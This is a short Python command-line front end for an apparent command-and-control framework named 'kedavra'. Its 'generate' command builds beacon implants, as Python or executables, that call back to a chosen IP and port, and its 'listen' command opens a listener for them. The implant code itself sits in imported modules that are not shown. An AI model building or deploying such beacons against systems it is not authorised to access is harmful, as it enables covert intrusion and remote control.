import click
import os
import subprocess

from kedavra import c2, compile_script, listeners

@click.group()
def main():
    """Main command-line interface."""
    pass

@click.command()
@click.option('--beacon_type', required=True, type=str, help='Beacon type')
@click.option('--dest_ip', required=True, type=str, help='Destination ip')
@click.option('--dest_port', required=True, type=int, help='Destination port')
@click.option('--freq', type=int, default=10, help='Beaconning frequency')
@click.option('--output', type=str, default='beacon', help='Beaconning frequency')
@click.option('--format',
              type=click.Choice(['py', 'exe'], case_sensitive=False))
def generate(beacon_type : str,
             dest_ip : str,
             dest_port : int,
             freq : int,
             output : str,
             format: str):
    """Generate a beacon"""
    if output == 'beacon':
        output += format
    path = f'{beacon_type}.py'    
    server = c2(dest_ip, dest_port, freq=freq)
    compile_script(server, path, output, format)

@click.command()
@click.option('--listener_type', required=True, type=str, help='Listener type')
@click.option('--port', required=True, type=int, help='Listen to a beacon')
def listen(listener_type, port: int):
    """Listen to a beacon"""
    server = c2('0.0.0.0', port)
    listeners[listener_type].run(server)

# Ajoutez les commandes au groupe principal
main.add_command(generate)
main.add_command(listen)

if __name__ == '__main__':
    main()
